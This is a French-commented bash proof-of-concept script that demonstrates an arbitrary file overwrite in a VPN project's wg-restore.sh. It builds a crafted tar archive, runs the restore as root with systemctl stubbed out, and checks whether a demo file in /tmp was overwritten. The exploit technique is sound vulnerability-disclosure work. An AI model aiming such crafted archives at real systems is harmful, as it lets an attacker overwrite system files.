#!/bin/bash
# --- PoC : Vulnerability V6 (Arbitrary File Overwrite via Restore) ---
# Ce script démontre que wg-restore.sh permet d'écraser n'importe quel fichier système.

# 1. Préparation de la cible de démonstration
TARGET_FILE="/tmp/v6_pwned.txt"
echo "Contenu Original" > "$TARGET_FILE"
echo "[INFO] Fichier cible créé : $TARGET_FILE"

# 2. Création de l'archive malveillante
MALICIOUS_DIR="tmp"
MALICIOUS_FILE="v6_pwned.txt"
ARCHIVE_PATH="/tmp/malicious_backup.tar.gz"

mkdir -p "/tmp/poc_payload/$MALICIOUS_DIR"
echo "PWNED BY VUK-FUX EXPLOIT" > "/tmp/poc_payload/$MALICIOUS_DIR/$MALICIOUS_FILE"

echo "[INFO] Création de l'archive malveillante..."
tar -czf "$ARCHIVE_PATH" -C "/tmp/poc_payload" "$MALICIOUS_DIR/$MALICIOUS_FILE"

# 3. Exécution du "Restore"
echo "[INFO] Tentative de restauration malveillante via wg-restore.sh..."
# On utilise un alias pour simuler le succès de systemctl si les services n'existent pas
# Cela permet de prouver que le TAR s'exécutera si le script n'est pas interrompu.
if sudo bash -c "function systemctl() { return 0; }; export -f systemctl; ./core-vpn/scripts/wg-restore.sh $ARCHIVE_PATH"; then
    echo "[INFO] Script de restauration terminé."
else
    echo "[ERROR] Échec de l'exécution du script."
fi

# 4. Vérification
RESULT=$(cat "$TARGET_FILE")
echo "--- RÉSULTAT ---"
echo "Contenu final de $TARGET_FILE : $RESULT"

if [ "$RESULT" == "PWNED BY VUK-FUX EXPLOIT" ]; then
    echo "[❌ VULNÉRABLE] Le fichier système a été écrasé via la restauration."
else
    echo "[✅ SECURE] Le fichier n'a pas été écrasé."
fi

# Cleanup
rm -rf /tmp/poc_payload "$ARCHIVE_PATH"
